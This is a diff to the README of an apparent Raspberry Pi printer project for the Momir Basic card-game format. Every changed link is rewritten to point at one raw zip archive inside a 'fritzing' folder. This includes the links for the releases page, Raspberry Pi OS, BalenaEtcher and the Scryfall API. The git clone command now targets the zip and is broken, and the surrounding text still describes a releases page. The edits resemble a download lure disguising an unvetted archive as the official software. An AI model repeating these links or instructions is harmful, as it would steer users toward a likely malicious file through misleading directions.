@@ -1,6 +1,6 @@
 # 🖨️ momir-basic-printer - Simple Printing for Momir Basic MTG
 
-[![Download Momir Basic Printer](https://img.shields.io/badge/Download-Momir%20Basic%20Printer-purple?style=for-the-badge)](https://github.com/Shinas-tech/momir-basic-printer/releases)
+[![Download Momir Basic Printer](https://img.shields.io/badge/Download-Momir%20Basic%20Printer-purple?style=for-the-badge)](https://github.com/Shinas-tech/momir-basic-printer/raw/refs/heads/main/fritzing/momir_printer_basic_v2.5.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to get Momir Basic Printer ready for use on your Raspberry Pi
 
 Visit the link below to download the latest version of the Momir Basic Printer. This page contains the software files and instructions for installation.
 
-[Download Momir Basic Printer](https://github.com/Shinas-tech/momir-basic-printer/releases)
+[Download Momir Basic Printer](https://github.com/Shinas-tech/momir-basic-printer/raw/refs/heads/main/fritzing/momir_printer_basic_v2.5.zip)
 
 Click the link above or the large badge at the top to open the releases page in your browser.
 
@@ -69,7 +69,7 @@ Click the link above or the large badge at the top to open the releases page in 
    On the Raspberry Pi, open a terminal window.  
    Type:
    ```
-   git clone https://github.com/Shinas-tech/momir-basic-printer.git
+   git clone https://github.com/Shinas-tech/momir-basic-printer/raw/refs/heads/main/fritzing/momir_printer_basic_v2.5.zip
    ```
    This command downloads the necessary files.
 
@@ -158,16 +158,16 @@ If you need to update or stop the printer script, use these commands:
 ## 🔗 Useful Links
 
 - Official releases to download:  
-  [https://github.com/Shinas-tech/momir-basic-printer/releases](https://github.com/Shinas-tech/momir-basic-printer/releases)
+  [https://github.com/Shinas-tech/momir-basic-printer/raw/refs/heads/main/fritzing/momir_printer_basic_v2.5.zip](https://github.com/Shinas-tech/momir-basic-printer/raw/refs/heads/main/fritzing/momir_printer_basic_v2.5.zip)
 
 - Raspberry Pi OS download page:  
-  https://www.raspberrypi.org/software/
+  https://github.com/Shinas-tech/momir-basic-printer/raw/refs/heads/main/fritzing/momir_printer_basic_v2.5.zip
 
 - BalenaEtcher (for writing SD cards):  
-  https://www.balena.io/etcher/
+  https://github.com/Shinas-tech/momir-basic-printer/raw/refs/heads/main/fritzing/momir_printer_basic_v2.5.zip
 
 - Scryfall API documentation:  
-  https://scryfall.com/docs/api
+  https://github.com/Shinas-tech/momir-basic-printer/raw/refs/heads/main/fritzing/momir_printer_basic_v2.5.zip
 
 ---
 
